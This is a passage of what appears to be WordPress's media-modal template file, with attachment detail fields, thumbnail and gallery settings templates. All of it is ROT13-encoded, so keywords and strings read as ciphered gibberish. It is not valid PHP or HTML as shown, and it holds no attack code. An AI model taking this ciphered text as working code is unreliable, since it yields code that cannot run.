				<?cuc vs ( cbfg_glcr_fhccbegf( 'nggnpuzrag', 'gvgyr' ) ) : ?>
				<fcna pynff=\"frggvat\" qngn-frggvat=\"gvgyr\">
					<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-gvgyr\" pynff=\"anzr\"><?cuc _r( 'Gvgyr' ); ?></ynory>
					<vachg glcr=\"grkg\" vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-gvgyr\" inyhr=\"{{ qngn.gvgyr }}\" {{ znlorErnqBayl }} />
				</fcna>
				<?cuc raqvs; ?>
				<# vs ( 'nhqvb' === qngn.glcr ) { #>
				<?cuc
				sbernpu ( neenl(
					'negvfg' => __( 'Negvfg' ),
					'nyohz'  => __( 'Nyohz' ),
				) nf $xrl => $ynory ) :
					?>
				<fcna pynff=\"frggvat\" qngn-frggvat=\"<?cuc rpub rfp_ngge( $xrl ); ?>\">
					<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-<?cuc rpub rfp_ngge( $xrl ); ?>\" pynff=\"anzr\"><?cuc rpub $ynory; ?></ynory>
					<vachg glcr=\"grkg\" vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-<?cuc rpub rfp_ngge( $xrl ); ?>\" inyhr=\"{{ qngn.<?cuc rpub $xrl; ?> || qngn.zrgn.<?cuc rpub $xrl; ?> || '' }}\" />
				</fcna>
				<?cuc raqsbernpu; ?>
				<# } #>
				<fcna pynff=\"frggvat\" qngn-frggvat=\"pncgvba\">
					<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-pncgvba\" pynff=\"anzr\"><?cuc _r( 'Pncgvba' ); ?></ynory>
					<grkgnern vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-pncgvba\" {{ znlorErnqBayl }}>{{ qngn.pncgvba }}</grkgnern>
				</fcna>
				<fcna pynff=\"frggvat\" qngn-frggvat=\"qrfpevcgvba\">
					<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-qrfpevcgvba\" pynff=\"anzr\"><?cuc _r( 'Qrfpevcgvba' ); ?></ynory>
					<grkgnern vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-qrfpevcgvba\" {{ znlorErnqBayl }}>{{ qngn.qrfpevcgvba }}</grkgnern>
				</fcna>
				<fcna pynff=\"frggvat\" qngn-frggvat=\"hey\">
					<ynory sbe=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-pbcl-yvax\" pynff=\"anzr\"><?cuc _r( 'Svyr HEY:' ); ?></ynory>
					<vachg glcr=\"grkg\" pynff=\"nggnpuzrag-qrgnvyf-pbcl-yvax\" vq=\"nggnpuzrag-qrgnvyf-gjb-pbyhza-pbcl-yvax\" inyhr=\"{{ qngn.hey }}\" ernqbayl />
					<fcna pynff=\"pbcl-gb-pyvcobneq-pbagnvare\">
						<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-fznyy pbcl-nggnpuzrag-hey\" qngn-pyvcobneq-gnetrg=\"#nggnpuzrag-qrgnvyf-gjb-pbyhza-pbcl-yvax\"><?cuc _r( 'Pbcl HEY gb pyvcobneq' ); ?></ohggba>
						<fcna pynff=\"fhpprff uvqqra\" nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcvrq!' ); ?></fcna>
					</fcna>
				</fcna>
				<qvi pynff=\"nggnpuzrag-pbzcng\"></qvi>
			</qvi>

			<qvi pynff=\"npgvbaf\">
				<# vs ( qngn.yvax ) { #>
					<?cuc
					$ivrj_zrqvn_grkg = ( '1' === trg_bcgvba( 'jc_nggnpuzrag_cntrf_ranoyrq' ) ) ? __( 'Ivrj nggnpuzrag cntr' ) : __( 'Ivrj zrqvn svyr' );
					?>
					<n pynff=\"ivrj-nggnpuzrag\" uers=\"{{ qngn.yvax }}\"><?cuc rpub $ivrj_zrqvn_grkg; ?></n>
				<# } #>
				<# vs ( qngn.pna.fnir ) { #>
					<# vs ( qngn.yvax ) { #>
						<fcna pynff=\"yvaxf-frcnengbe\">|</fcna>
					<# } #>
					<n uers=\"{{ qngn.rqvgYvax }}\"><?cuc _r( 'Rqvg zber qrgnvyf' ); ?></n>
				<# } #>
				<# vs ( qngn.pna.fnir && qngn.yvax ) { #>
					<fcna pynff=\"yvaxf-frcnengbe\">|</fcna>
					<n uers=\"{{ qngn.hey }}\" qbjaybnq><?cuc _r( 'Qbjaybnq svyr' ); ?></n>
				<# } #>
				<# vs ( ! qngn.hcybnqvat && qngn.pna.erzbir ) { #>
					<# vs ( qngn.yvax || qngn.pna.fnir ) { #>
						<fcna pynff=\"yvaxf-frcnengbe\">|</fcna>
					<# } #>
					<?cuc vs ( ZRQVN_GENFU ) : ?>
						<# vs ( 'genfu' === qngn.fgnghf ) { #>
							<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax hagenfu-nggnpuzrag\"><?cuc _r( 'Erfgber sebz Genfu' ); ?></ohggba>
						<# } ryfr { #>
							<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax genfu-nggnpuzrag\"><?cuc _r( 'Zbir gb Genfu' ); ?></ohggba>
						<# } #>
					<?cuc ryfr : ?>
						<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax qryrgr-nggnpuzrag\"><?cuc _r( 'Qryrgr creznaragyl' ); ?></ohggba>
					<?cuc raqvs; ?>
				<# } #>
			</qvi>
		</qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Nggnpuzrag \"guhzoanvyf\" va gur Zrqvn Tevq. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-nggnpuzrag\">
		<qvi pynff=\"nggnpuzrag-cerivrj wf--fryrpg-nggnpuzrag glcr-{{ qngn.glcr }} fhoglcr-{{ qngn.fhoglcr }} {{ qngn.bevragngvba }}\">
			<qvi pynff=\"guhzoanvy\">
				<# vs ( qngn.hcybnqvat ) { #>
					<qvi pynff=\"zrqvn-cebterff-one\"><qvi fglyr=\"jvqgu: {{ qngn.creprag }}%\"></qvi></qvi>
				<# } ryfr vs ( 'vzntr' === qngn.glcr && qngn.fvmr && qngn.fvmr.hey ) { #>
					<qvi pynff=\"pragrerq\">
						<vzt fep=\"{{ qngn.fvmr.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
					</qvi>
				<# } ryfr { #>
					<qvi pynff=\"pragrerq\">
						<# vs ( qngn.vzntr && qngn.vzntr.fep && qngn.vzntr.fep !== qngn.vpba ) { #>
							<vzt fep=\"{{ qngn.vzntr.fep }}\" pynff=\"guhzoanvy\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<# } ryfr vs ( qngn.fvmrf ) {
								vs ( qngn.fvmrf.zrqvhz ) { #>
									<vzt fep=\"{{ qngn.fvmrf.zrqvhz.hey }}\" pynff=\"guhzoanvy\" qenttnoyr=\"snyfr\" nyg=\"\" />
								<# } ryfr { #>
									<vzt fep=\"{{ qngn.fvmrf.shyy.hey }}\" pynff=\"guhzoanvy\" qenttnoyr=\"snyfr\" nyg=\"\" />
								<# } #>
						<# } ryfr { #>
							<vzt fep=\"{{ qngn.vpba }}\" pynff=\"vpba\" qenttnoyr=\"snyfr\" nyg=\"\" />
						<# } #>
					</qvi>
					<qvi pynff=\"svyranzr\">
						<qvi>{{ qngn.svyranzr }}</qvi>
					</qvi>
				<# } #>
			</qvi>
			<# vs ( qngn.ohggbaf.pybfr ) { #>
				<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax nggnpuzrag-pybfr zrqvn-zbqny-vpba\"><fcna pynff=\"fperra-ernqre-grkg\">
					<?cuc
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					_r( 'Erzbir' );
					?>
				</fcna></ohggba>
			<# } #>
		</qvi>
		<# vs ( qngn.ohggbaf.purpx ) { #>
			<ohggba glcr=\"ohggba\" pynff=\"purpx\" gnovaqrk=\"-1\"><fcna pynff=\"zrqvn-zbqny-vpba\"></fcna><fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Qrfryrpg' );
				?>
			</fcna></ohggba>
		<# } #>
		<#
		ine znlorErnqBayl = qngn.pna.fnir || qngn.nyybjYbpnyRqvgf ? '' : 'ernqbayl';
		vs ( qngn.qrfpevor ) {
			vs ( 'vzntr' === qngn.glcr ) { #>
				<vachg glcr=\"grkg\" inyhr=\"{{ qngn.pncgvba }}\" pynff=\"qrfpevor\" qngn-frggvat=\"pncgvba\"
					nevn-ynory=\"<?cuc rfp_ngge_r( 'Pncgvba' ); ?>\"
					cynprubyqre=\"<?cuc rfp_ngge_r( 'Pncgvba&uryyvc;' ); ?>\" {{ znlorErnqBayl }} />
			<# } ryfr { #>
				<vachg glcr=\"grkg\" inyhr=\"{{ qngn.gvgyr }}\" pynff=\"qrfpevor\" qngn-frggvat=\"gvgyr\"
					<# vs ( 'ivqrb' === qngn.glcr ) { #>
						nevn-ynory=\"<?cuc rfp_ngge_r( 'Ivqrb gvgyr' ); ?>\"
						cynprubyqre=\"<?cuc rfp_ngge_r( 'Ivqrb gvgyr&uryyvc;' ); ?>\"
					<# } ryfr vs ( 'nhqvb' === qngn.glcr ) { #>
						nevn-ynory=\"<?cuc rfp_ngge_r( 'Nhqvb gvgyr' ); ?>\"
						cynprubyqre=\"<?cuc rfp_ngge_r( 'Nhqvb gvgyr&uryyvc;' ); ?>\"
					<# } ryfr { #>
						nevn-ynory=\"<?cuc rfp_ngge_r( 'Zrqvn gvgyr' ); ?>\"
						cynprubyqre=\"<?cuc rfp_ngge_r( 'Zrqvn gvgyr&uryyvc;' ); ?>\"
					<# } #> {{ znlorErnqBayl }} />
			<# }
		} #>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Nggnpuzrag qrgnvyf, hfrq sbe rknzcyr va gur fvqrone. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-nggnpuzrag-qrgnvyf\">
		<u2>
			<?cuc _r( 'Nggnpuzrag Qrgnvyf' ); ?>
			<fcna pynff=\"frggvatf-fnir-fgnghf\" ebyr=\"fgnghf\">
				<fcna pynff=\"fcvaare\"></fcna>
				<fcna pynff=\"fnirq\"><?cuc rfp_ugzy_r( 'Fnirq.' ); ?></fcna>
			</fcna>
		</u2>
		<qvi pynff=\"nggnpuzrag-vasb\">

			<# vs ( 'nhqvb' === qngn.glcr ) { #>
				<qvi pynff=\"jc-zrqvn-jenccre jc-nhqvb\">
					<nhqvb fglyr=\"ivfvovyvgl: uvqqra\" pbagebyf pynff=\"jc-nhqvb-fubegpbqr\" jvqgu=\"100%\" cerybnq=\"abar\">
						<fbhepr glcr=\"{{ qngn.zvzr }}\" fep=\"{{ qngn.hey }}\" />
					</nhqvb>
				</qvi>
			<# } ryfr vs ( 'ivqrb' === qngn.glcr ) {
				ine j_ehyr = '';
				vs ( qngn.jvqgu ) {
					j_ehyr = 'jvqgu: ' + qngn.jvqgu + 'ck;';
				} ryfr vs ( jc.zrqvn.ivrj.frggvatf.pbagragJvqgu ) {
					j_ehyr = 'jvqgu: ' + jc.zrqvn.ivrj.frggvatf.pbagragJvqgu + 'ck;';
				}
			#>
				<qvi fglyr=\"{{ j_ehyr }}\" pynff=\"jc-zrqvn-jenccre jc-ivqrb\">
					<ivqrb pbagebyf=\"pbagebyf\" pynff=\"jc-ivqrb-fubegpbqr\" cerybnq=\"zrgnqngn\"
						<# vs ( qngn.jvqgu ) { #>jvqgu=\"{{ qngn.jvqgu }}\"<# } #>
						<# vs ( qngn.urvtug ) { #>urvtug=\"{{ qngn.urvtug }}\"<# } #>
						<# vs ( qngn.vzntr && qngn.vzntr.fep !== qngn.vpba ) { #>cbfgre=\"{{ qngn.vzntr.fep }}\"<# } #>>
						<fbhepr glcr=\"{{ qngn.zvzr }}\" fep=\"{{ qngn.hey }}\" />
					</ivqrb>
				</qvi>
			<# } ryfr { #>
				<qvi pynff=\"guhzoanvy guhzoanvy-{{ qngn.glcr }}\">
					<# vs ( qngn.hcybnqvat ) { #>
						<qvi pynff=\"zrqvn-cebterff-one\"><qvi></qvi></qvi>
					<# } ryfr vs ( 'vzntr' === qngn.glcr && qngn.fvmr && qngn.fvmr.hey ) { #>
						<vzt fep=\"{{ qngn.fvmr.hey }}\" qenttnoyr=\"snyfr\" nyg=\"\" />
					<# } ryfr { #>
						<vzt fep=\"{{ qngn.vpba }}\" pynff=\"vpba\" qenttnoyr=\"snyfr\" nyg=\"\" />
					<# } #>
				</qvi>
			<# } #>

			<qvi pynff=\"qrgnvyf\">
				<qvi pynff=\"svyranzr\">{{ qngn.svyranzr }}</qvi>
				<qvi pynff=\"hcybnqrq\">{{ qngn.qngrSbeznggrq }}</qvi>

				<qvi pynff=\"svyr-fvmr\">{{ qngn.svyrfvmrUhznaErnqnoyr }}</qvi>
				<# vs ( 'vzntr' === qngn.glcr && ! qngn.hcybnqvat ) { #>
					<# vs ( qngn.jvqgu && qngn.urvtug ) { #>
						<qvi pynff=\"qvzrafvbaf\">
							<?cuc
							/* genafyngbef: 1: N ahzore bs cvkryf jvqr, 2: N ahzore bs cvkryf gnyy. */
							cevags( __( '%1$f ol %2$f cvkryf' ), '{{ qngn.jvqgu }}', '{{ qngn.urvtug }}' );
							?>
						</qvi>
					<# } #>

					<# vs ( qngn.bevtvanyVzntrHEY && qngn.bevtvanyVzntrAnzr ) { #>
						<qvi pynff=\"jbeq-jenc-oernx-jbeq\">
							<?cuc _r( 'Bevtvany vzntr:' ); ?>
							<n uers=\"{{ qngn.bevtvanyVzntrHEY }}\">{{qngn.bevtvanyVzntrAnzr}}</n>
						</qvi>
					<# } #>

					<# vs ( qngn.pna.fnir && qngn.fvmrf ) { #>
						<n pynff=\"rqvg-nggnpuzrag\" uers=\"{{ qngn.rqvgYvax }}&nzc;vzntr-rqvgbe\" gnetrg=\"_oynax\"><?cuc _r( 'Rqvg Vzntr' ); ?></n>
					<# } #>
				<# } #>

				<# vs ( qngn.svyrYratgu && qngn.svyrYratguUhznaErnqnoyr ) { #>
					<qvi pynff=\"svyr-yratgu\"><?cuc _r( 'Yratgu:' ); ?>
						<fcna nevn-uvqqra=\"gehr\">{{ qngn.svyrYratguUhznaErnqnoyr }}</fcna>
						<fcna pynff=\"fperra-ernqre-grkg\">{{ qngn.svyrYratguUhznaErnqnoyr }}</fcna>
					</qvi>
				<# } #>

				<# vs ( qngn.zrqvnFgngrf ) { #>
					<qvi pynff=\"zrqvn-fgngrf\"><fgebat><?cuc _r( 'Hfrq nf:' ); ?></fgebat> {{ qngn.zrqvnFgngrf }}</qvi>
				<# } #>

				<# vs ( ! qngn.hcybnqvat && qngn.pna.erzbir ) { #>
					<?cuc vs ( ZRQVN_GENFU ) : ?>
					<# vs ( 'genfu' === qngn.fgnghf ) { #>
						<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax hagenfu-nggnpuzrag\"><?cuc _r( 'Erfgber sebz Genfu' ); ?></ohggba>
					<# } ryfr { #>
						<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax genfu-nggnpuzrag\"><?cuc _r( 'Zbir gb Genfu' ); ?></ohggba>
					<# } #>
					<?cuc ryfr : ?>
						<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax qryrgr-nggnpuzrag\"><?cuc _r( 'Qryrgr creznaragyl' ); ?></ohggba>
					<?cuc raqvs; ?>
				<# } #>

				<qvi pynff=\"pbzcng-zrgn\">
					<# vs ( qngn.pbzcng && qngn.pbzcng.zrgn ) { #>
						{{{ qngn.pbzcng.zrgn }}}
					<# } #>
				</qvi>
			</qvi>
		</qvi>
		<# ine znlorErnqBayl = qngn.pna.fnir || qngn.nyybjYbpnyRqvgf ? '' : 'ernqbayl'; #>
		<# vs ( 'vzntr' === qngn.glcr ) { #>
			<fcna pynff=\"frggvat nyg-grkg unf-qrfpevcgvba\" qngn-frggvat=\"nyg\">
				<ynory sbe=\"nggnpuzrag-qrgnvyf-nyg-grkg\" pynff=\"anzr\"><?cuc _r( 'Nyg Grkg' ); ?></ynory>
				<grkgnern vq=\"nggnpuzrag-qrgnvyf-nyg-grkg\" nevn-qrfpevorqol=\"nyg-grkg-qrfpevcgvba\" {{ znlorErnqBayl }}>{{ qngn.nyg }}</grkgnern>
			</fcna>
			<c pynff=\"qrfpevcgvba\" vq=\"nyg-grkg-qrfpevcgvba\"><?cuc rpub $nyg_grkg_qrfpevcgvba; ?></c>
		<# } #>
		<?cuc vs ( cbfg_glcr_fhccbegf( 'nggnpuzrag', 'gvgyr' ) ) : ?>
		<fcna pynff=\"frggvat\" qngn-frggvat=\"gvgyr\">
			<ynory sbe=\"nggnpuzrag-qrgnvyf-gvgyr\" pynff=\"anzr\"><?cuc _r( 'Gvgyr' ); ?></ynory>
			<vachg glcr=\"grkg\" vq=\"nggnpuzrag-qrgnvyf-gvgyr\" inyhr=\"{{ qngn.gvgyr }}\" {{ znlorErnqBayl }} />
		</fcna>
		<?cuc raqvs; ?>
		<# vs ( 'nhqvb' === qngn.glcr ) { #>
		<?cuc
		sbernpu ( neenl(
			'negvfg' => __( 'Negvfg' ),
			'nyohz'  => __( 'Nyohz' ),
		) nf $xrl => $ynory ) :
			?>
		<fcna pynff=\"frggvat\" qngn-frggvat=\"<?cuc rpub rfp_ngge( $xrl ); ?>\">
			<ynory sbe=\"nggnpuzrag-qrgnvyf-<?cuc rpub rfp_ngge( $xrl ); ?>\" pynff=\"anzr\"><?cuc rpub $ynory; ?></ynory>
			<vachg glcr=\"grkg\" vq=\"nggnpuzrag-qrgnvyf-<?cuc rpub rfp_ngge( $xrl ); ?>\" inyhr=\"{{ qngn.<?cuc rpub $xrl; ?> || qngn.zrgn.<?cuc rpub $xrl; ?> || '' }}\" />
		</fcna>
		<?cuc raqsbernpu; ?>
		<# } #>
		<fcna pynff=\"frggvat\" qngn-frggvat=\"pncgvba\">
			<ynory sbe=\"nggnpuzrag-qrgnvyf-pncgvba\" pynff=\"anzr\"><?cuc _r( 'Pncgvba' ); ?></ynory>
			<grkgnern vq=\"nggnpuzrag-qrgnvyf-pncgvba\" {{ znlorErnqBayl }}>{{ qngn.pncgvba }}</grkgnern>
		</fcna>
		<fcna pynff=\"frggvat\" qngn-frggvat=\"qrfpevcgvba\">
			<ynory sbe=\"nggnpuzrag-qrgnvyf-qrfpevcgvba\" pynff=\"anzr\"><?cuc _r( 'Qrfpevcgvba' ); ?></ynory>
			<grkgnern vq=\"nggnpuzrag-qrgnvyf-qrfpevcgvba\" {{ znlorErnqBayl }}>{{ qngn.qrfpevcgvba }}</grkgnern>
		</fcna>
		<fcna pynff=\"frggvat\" qngn-frggvat=\"hey\">
			<ynory sbe=\"nggnpuzrag-qrgnvyf-pbcl-yvax\" pynff=\"anzr\"><?cuc _r( 'Svyr HEY:' ); ?></ynory>
			<vachg glcr=\"grkg\" pynff=\"nggnpuzrag-qrgnvyf-pbcl-yvax\" vq=\"nggnpuzrag-qrgnvyf-pbcl-yvax\" inyhr=\"{{ qngn.hey }}\" ernqbayl />
			<qvi pynff=\"pbcl-gb-pyvcobneq-pbagnvare\">
				<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-fznyy pbcl-nggnpuzrag-hey\" qngn-pyvcobneq-gnetrg=\"#nggnpuzrag-qrgnvyf-pbcl-yvax\"><?cuc _r( 'Pbcl HEY gb pyvcobneq' ); ?></ohggba>
				<fcna pynff=\"fhpprff uvqqra\" nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcvrq!' ); ?></fcna>
			</qvi>
		</fcna>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Fryrpgvba fgnghf one. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-zrqvn-fryrpgvba\">
		<qvi pynff=\"fryrpgvba-vasb\">
			<fcna pynff=\"pbhag\"></fcna>
			<# vs ( qngn.rqvgnoyr ) { #>
				<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rqvg-fryrpgvba\"><?cuc _r( 'Rqvg Fryrpgvba' ); ?></ohggba>
			<# } #>
			<# vs ( qngn.pyrnenoyr ) { #>
				<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax pyrne-fryrpgvba\"><?cuc _r( 'Pyrne' ); ?></ohggba>
			<# } #>
		</qvi>
		<qvi pynff=\"fryrpgvba-ivrj\"></qvi>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Nggnpuzrag qvfcynl frggvatf, hfrq sbe rknzcyr va gur fvqrone. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-nggnpuzrag-qvfcynl-frggvatf\">
		<u2><?cuc _r( 'Nggnpuzrag Qvfcynl Frggvatf' ); ?></u2>

		<# vs ( 'vzntr' === qngn.glcr ) { #>
			<fcna pynff=\"frggvat nyvta\">
				<ynory sbe=\"nggnpuzrag-qvfcynl-frggvatf-nyvtazrag\" pynff=\"anzr\"><?cuc _r( 'Nyvtazrag' ); ?></ynory>
				<fryrpg vq=\"nggnpuzrag-qvfcynl-frggvatf-nyvtazrag\" pynff=\"nyvtazrag\"
					qngn-frggvat=\"nyvta\"
					<# vs ( qngn.hfreFrggvatf ) { #>
						qngn-hfre-frggvat=\"nyvta\"
					<# } #>>

					<bcgvba inyhr=\"yrsg\">
						<?cuc rfp_ugzy_r( 'Yrsg' ); ?>
					</bcgvba>
					<bcgvba inyhr=\"pragre\">
						<?cuc rfp_ugzy_r( 'Pragre' ); ?>
					</bcgvba>
					<bcgvba inyhr=\"evtug\">
						<?cuc rfp_ugzy_r( 'Evtug' ); ?>
					</bcgvba>
					<bcgvba inyhr=\"abar\" fryrpgrq>
						<?cuc rpub rfp_ugzy_k( 'Abar', 'Nyvtazrag bcgvba' ); ?>
					</bcgvba>
				</fryrpg>
			</fcna>
		<# } #>

		<fcna pynff=\"frggvat\">
			<ynory sbe=\"nggnpuzrag-qvfcynl-frggvatf-yvax-gb\" pynff=\"anzr\">
				<# vs ( qngn.zbqry.pnaRzorq ) { #>
					<?cuc _r( 'Rzorq be Yvax' ); ?>
				<# } ryfr { #>
					<?cuc _r( 'Yvax Gb' ); ?>
				<# } #>
			</ynory>
			<fryrpg vq=\"nggnpuzrag-qvfcynl-frggvatf-yvax-gb\" pynff=\"yvax-gb\"
				qngn-frggvat=\"yvax\"
				<# vs ( qngn.hfreFrggvatf && ! qngn.zbqry.pnaRzorq ) { #>
					qngn-hfre-frggvat=\"heyohggba\"
				<# } #>>

			<# vs ( qngn.zbqry.pnaRzorq ) { #>
				<bcgvba inyhr=\"rzorq\" fryrpgrq>
					<?cuc rfp_ugzy_r( 'Rzorq Zrqvn Cynlre' ); ?>
				</bcgvba>
				<bcgvba inyhr=\"svyr\">
			<# } ryfr { #>
				<bcgvba inyhr=\"abar\" fryrpgrq>
					<?cuc rpub rfp_ugzy_k( 'Abar', 'Zrqvn vgrz yvax bcgvba' ); ?>
				</bcgvba>
				<bcgvba inyhr=\"svyr\">
			<# } #>
				<# vs ( qngn.zbqry.pnaRzorq ) { #>
					<?cuc rfp_ugzy_r( 'Yvax gb Zrqvn Svyr' ); ?>
				<# } ryfr { #>
					<?cuc rfp_ugzy_r( 'Zrqvn Svyr' ); ?>
				<# } #>
				</bcgvba>
				<bcgvba inyhr=\"cbfg\">
				<# vs ( qngn.zbqry.pnaRzorq ) { #>
					<?cuc rfp_ugzy_r( 'Yvax gb Nggnpuzrag Cntr' ); ?>
				<# } ryfr { #>
					<?cuc rfp_ugzy_r( 'Nggnpuzrag Cntr' ); ?>
				<# } #>
				</bcgvba>
			<# vs ( 'vzntr' === qngn.glcr ) { #>
				<bcgvba inyhr=\"phfgbz\">
					<?cuc rfp_ugzy_r( 'Phfgbz HEY' ); ?>
				</bcgvba>
			<# } #>
			</fryrpg>
		</fcna>
		<fcna pynff=\"frggvat\">
			<ynory sbe=\"nggnpuzrag-qvfcynl-frggvatf-yvax-gb-phfgbz\" pynff=\"anzr\"><?cuc _r( 'HEY' ); ?></ynory>
			<vachg glcr=\"grkg\" vq=\"nggnpuzrag-qvfcynl-frggvatf-yvax-gb-phfgbz\" pynff=\"yvax-gb-phfgbz\" qngn-frggvat=\"yvaxHey\" />
		</fcna>

		<# vs ( 'haqrsvarq' !== glcrbs qngn.fvmrf ) { #>
			<fcna pynff=\"frggvat\">
				<ynory sbe=\"nggnpuzrag-qvfcynl-frggvatf-fvmr\" pynff=\"anzr\"><?cuc _r( 'Fvmr' ); ?></ynory>
				<fryrpg vq=\"nggnpuzrag-qvfcynl-frggvatf-fvmr\" pynff=\"fvmr\" anzr=\"fvmr\"
					qngn-frggvat=\"fvmr\"
					<# vs ( qngn.hfreFrggvatf ) { #>
						qngn-hfre-frggvat=\"vztfvmr\"
					<# } #>>
					<?cuc
					/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
					$fvmrf = nccyl_svygref(
						'vzntr_fvmr_anzrf_pubbfr',
						neenl(
							'guhzoanvy' => __( 'Guhzoanvy' ),
							'zrqvhz'    => __( 'Zrqvhz' ),
							'ynetr'     => __( 'Ynetr' ),
							'shyy'      => __( 'Shyy Fvmr' ),
						)
					);

					sbernpu ( $fvmrf nf $inyhr => $anzr ) :
						?>
						<#
						ine fvmr = qngn.fvmrf['<?cuc rpub rfp_wf( $inyhr ); ?>'];
						vs ( fvmr ) { #>
							<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $inyhr ); ?>\" <?cuc fryrpgrq( $inyhr, 'shyy' ); ?>>
								<?cuc rpub rfp_ugzy( $anzr ); ?> &aqnfu; {{ fvmr.jvqgu }} &gvzrf; {{ fvmr.urvtug }}
							</bcgvba>
						<# } #>
					<?cuc raqsbernpu; ?>
				</fryrpg>
			</fcna>
		<# } #>
	</fpevcg>

	<?cuc // Grzcyngr sbe gur Tnyyrel frggvatf, hfrq sbe rknzcyr va gur fvqrone. ?>
	<fpevcg glcr=\"grkg/ugzy\" vq=\"gzcy-tnyyrel-frggvatf\">
		<u2><?cuc _r( 'Tnyyrel Frggvatf' ); ?></u2>

		<fcna pynff=\"frggvat\">
			<ynory sbe=\"tnyyrel-frggvatf-yvax-gb\" pynff=\"anzr\"><?cuc _r( 'Yvax Gb' ); ?></ynory>
			<fryrpg vq=\"tnyyrel-frggvatf-yvax-gb\" pynff=\"yvax-gb\"
				qngn-frggvat=\"yvax\"
				<# vs ( qngn.hfreFrggvatf ) { #>
					qngn-hfre-frggvat=\"heyohggba\"
				<# } #>>

				<bcgvba inyhr=\"cbfg\" <# vs ( ! jc.zrqvn.tnyyrelQrsnhygf.yvax || 'cbfg' === jc.zrqvn.tnyyrelQrsnhygf.yvax ) {
					#>fryrpgrq=\"fryrpgrq\"<# }
				#>>
					<?cuc rfp_ugzy_r( 'Nggnpuzrag Cntr' ); ?>
				</bcgvba>
				<bcgvba inyhr=\"svyr\" <# vs ( 'svyr' === jc.zrqvn.tnyyrelQrsnhygf.yvax ) { #>fryrpgrq=\"fryrpgrq\"<# } #>>
					<?cuc rfp_ugzy_r( 'Zrqvn Svyr' ); ?>
				</bcgvba>
				<bcgvba inyhr=\"abar\" <# vs ( 'abar' === jc.zrqvn.tnyyrelQrsnhygf.yvax ) { #>fryrpgrq=\"fryrpgrq\"<# } #>>
					<?cuc rpub rfp_ugzy_k( 'Abar', 'Zrqvn vgrz yvax bcgvba' ); ?>
				</bcgvba>
			</fryrpg>
		</fcna>

		<fcna pynff=\"frggvat\">
			<ynory sbe=\"tnyyrel-frggvatf-pbyhzaf\" pynff=\"anzr fryrpg-ynory-vayvar\"><?cuc _r( 'Pbyhzaf' ); ?></ynory>
			<fryrpg vq=\"tnyyrel-frggvatf-pbyhzaf\" pynff=\"pbyhzaf\" anzr=\"pbyhzaf\"
				qngn-frggvat=\"pbyhzaf\">
				<?cuc sbe ( $v = 1; $v <= 9; $v++ ) : ?>
					<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $v ); ?>\" <#
						vs ( <?cuc rpub $v; ?> == jc.zrqvn.tnyyrelQrsnhygf.pbyhzaf ) { #>fryrpgrq=\"fryrpgrq\"<# }
					#>>
						<?cuc rpub rfp_ugzy( $v ); ?>
					</bcgvba>
				<?cuc raqsbe; ?>
			</fryrpg>
		</fcna>

		<fcna pynff=\"frggvat\">
			<vachg glcr=\"purpxobk\" vq=\"tnyyrel-frggvatf-enaqbz-beqre\" qngn-frggvat=\"_beqreolEnaqbz\" />
			<ynory sbe=\"tnyyrel-frggvatf-enaqbz-beqre\" pynff=\"purpxobk-ynory-vayvar\"><?cuc _r( 'Enaqbz Beqre' ); ?></ynory>
		</fcna>

		<fcna pynff=\"frggvat fvmr\">
			<ynory sbe=\"tnyyrel-frggvatf-fvmr\" pynff=\"anzr\"><?cuc _r( 'Fvmr' ); ?></ynory>
			<fryrpg vq=\"tnyyrel-frggvatf-fvmr\" pynff=\"fvmr\" anzr=\"fvmr\"
				qngn-frggvat=\"fvmr\"
				<# vs ( qngn.hfreFrggvatf ) { #>
					qngn-hfre-frggvat=\"vztfvmr\"
				<# } #>
				>
				<?cuc
				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/zrqvn.cuc */
				$fvmr_anzrf = nccyl_svygref(
					'vzntr_fvmr_anzrf_pubbfr',
					neenl(
						'guhzoanvy' => __( 'Guhzoanvy' ),
						'zrqvhz'    => __( 'Zrqvhz' ),
						'ynetr'     => __( 'Ynetr' ),
						'shyy'      => __( 'Shyy Fvmr' ),
					)
				);

				sbernpu ( $fvmr_anzrf nf $fvmr => $ynory ) :
					?>
					<bcgvba inyhr=\"<?cuc rpub rfp_ngge( $fvmr ); ?>\">
						<?cuc rpub rfp_ugzy( $ynory ); ?>
					</bcgvba>
				<?cuc raqsbernpu; ?>
			</fryrpg>
		</fcna>
